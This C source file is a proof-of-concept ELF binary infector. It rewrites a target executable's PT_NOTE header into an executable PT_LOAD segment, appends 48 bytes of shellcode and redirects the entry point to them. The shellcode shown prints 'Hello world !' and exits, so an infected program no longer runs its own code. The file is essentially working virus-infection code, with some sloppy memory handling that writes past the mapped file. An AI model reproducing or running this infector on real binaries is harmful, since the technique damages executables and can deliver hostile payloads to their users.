#include <elf.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char payload[48] = "\xe8\x0f\x00\x00\x00\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x20\x21\x0a\x00\x5e\xbf\x01\x00\x00\x00\xba\x0e\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05";

int poc(char *filename)
{
	struct stat sb;
	int fd = open(filename, O_RDWR);
	if (fd < 0)
		return (1);
	lstat(filename, &sb);
	void *addr = mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	Elf64_Ehdr *ehdr = addr;
	Elf64_Phdr *phdr = (Elf64_Phdr *)(addr + ehdr->e_phoff);
	int max = 0;
	int size_max = 0;
	// get vaddr
	int i = 0;
	while (i < ehdr->e_phnum)
	{
		if (phdr->p_vaddr + phdr->p_memsz > max)
			max = phdr->p_vaddr + phdr->p_memsz;
		phdr += 1;
		i++;
	}
	phdr = (Elf64_Phdr *)(addr + ehdr->e_phoff);
	// infect
	i = 0;
	while (i < ehdr->e_phnum)
	{
		if (phdr->p_type == PT_NOTE)
		{
			printf("FOUND !\n");
			phdr->p_type = PT_LOAD;
			phdr->p_flags = PF_X | PF_R;
			phdr->p_offset = sb.st_size;
			phdr->p_vaddr = phdr->p_offset % 0x1000 + (max / 0x1000 + 1) * 0x1000;
			phdr->p_paddr = phdr->p_offset % 0x1000 + (max / 0x1000 + 1) * 0x1000;
			/*
				- entry_inject
				- vaddr_inject
				- entry_prg
				- vaddr_prg
				- entry_infect - vaddr_inject
			*/
			printf("p_vaddr - p_offset: %lx\n", phdr->p_vaddr - phdr->p_offset);
			phdr->p_filesz = 48;
			phdr->p_memsz = 48;
			phdr->p_align = 0x1000;
			ehdr->e_entry = (phdr->p_vaddr - phdr->p_offset) + sb.st_size;
			memcpy(addr + sb.st_size, payload, 48);
			break;
		}
		phdr += 1;
		i++;
	}
	write(fd, addr, sb.st_size + 48);
	close(fd);
	return (0);
}

int			main(int argc, char *argv[])
{
	if (argc != 2)
		return (1);
	poc(argv[1]);
	return (0);
}
